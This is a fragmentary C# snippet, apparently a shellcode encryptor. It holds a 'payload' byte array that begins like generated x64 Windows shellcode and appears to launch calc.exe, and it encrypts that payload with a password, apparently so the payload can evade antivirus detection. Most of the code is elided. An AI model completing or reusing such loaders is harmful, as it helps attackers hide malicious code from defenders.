...
public class EncryptionProgram
{
    ...
    {
        // Check if a password has been provided as a command line argument
        if (args.Length == 0)
        {
        ...
        string password = args[0]; // Get the password from the first command line argument
        byte[] payload = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
...
0x63,0x2e,0x65,0x78,0x65,0x00};
        ...
        // Output the line to initialize the password bytes with the provided password
        Console.WriteLine("");
